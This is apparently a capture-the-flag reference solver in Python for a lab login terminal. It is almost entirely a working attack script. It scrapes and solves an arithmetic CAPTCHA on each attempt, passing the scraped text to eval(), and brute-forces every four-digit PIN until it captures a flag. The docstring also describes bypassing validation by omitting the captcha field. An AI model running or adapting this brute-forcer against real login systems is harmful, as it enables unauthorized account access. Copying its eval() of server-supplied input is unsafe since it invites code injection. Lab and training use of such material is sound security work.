#!/usr/bin/env python3
"""Operation 03 reference solver — Dokkaebi cracks Clash's perimeter terminal.

This is the classic arithmetic-CAPTCHA pattern: GET a fresh challenge, solve it
(it's plaintext arithmetic -- eval() is enough, same as any AttackDefense-style
CAPTCHA lab), POST it with a candidate PIN, repeat. The challenge is single-use
(it rotates on every response, GET or POST), so you cannot solve one and reuse
it -- the loop below re-solves it on every single attempt, on purpose.

The operator is randomized every time (+ - *) -- the parser below reads
whichever one is actually shown rather than assuming addition.

The PIN space is a plain, fully bounded 4-digit number: 0000-9999. That's
complete enumeration, not guessing -- 10,000 candidates is nothing with no
lockout in front of them.

(There's a SECOND, more severe bug here too -- omitting the `captcha` field
entirely skips validation altogether. That one is demonstrated with curl in
DEBRIEF.md rather than in this script, to keep this solver mirroring the
"intended" solve path: actually defeating the challenge, not skipping it.)

Usage: python3 op3.py [base_url]     (default http://localhost:8000)
"""
import sys, re, requests

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
CHALLENGE_RE = re.compile(r'id="captcha-challenge"[^>]*>\s*(\d+)\s*([+\-*])\s*(\d+)\s*=')
PIN_SPACE = 10_000


def solve_fresh_challenge(sess):
    """GET the terminal page, extract the operands AND the operator, eval() them.
    Mirrors bb.py/b.py from the course material -- just operator-agnostic now."""
    r = sess.get(f"{BASE}/op3/")
    m = CHALLENGE_RE.search(r.text)
    a, op, b = m.group(1), m.group(2), m.group(3)
    return eval(f"{a}{op}{b}")     # trivial on purpose -- that IS the finding


def attempt(sess, pin, captcha_answer):
    return sess.post(f"{BASE}/op3/login",
                     data={"pin": pin, "captcha": captcha_answer},
                     allow_redirects=False)


def fingerprint(r):
    return (r.status_code, len(r.content), r.headers.get("Location"))


def main():
    sess = requests.Session()

    baseline_answer = solve_fresh_challenge(sess)
    baseline = fingerprint(attempt(sess, "0000", baseline_answer))
    print(f"[*] baseline (known-wrong PIN, solved captcha) = "
          f"status {baseline[0]}, {baseline[1]} bytes, redirect={baseline[2]}")
    print(f"[*] brute-forcing all {PIN_SPACE:,} four-digit PINs "
          f"(no lockout, fresh +/-/* captcha each try)\n")

    for n in range(PIN_SPACE):
        pin = f"{n:04d}"
        answer = solve_fresh_challenge(sess)          # fresh challenge, every single attempt
        r = attempt(sess, pin, answer)
        if fingerprint(r) != baseline:
            console = sess.get(f"{BASE}/op3/console")
            flag = re.search(r"R6S\{[^}]*\}", console.text)
            if flag:
                print(f"[+] CRACKED after {n + 1:,}/{PIN_SPACE:,} tries: PIN {pin}")
                print(f"[+] OPERATION 03 FLAG: {flag.group(0)}")
                print("[+] Operation 04 is now unlocked at Command.")
                return
        if (n + 1) % 1000 == 0:
            print(f"    ...{n + 1:,}/{PIN_SPACE:,} tried")
    print("[!] full PIN space exhausted without a hit — check the terminal is reachable")


if __name__ == "__main__":
    main()
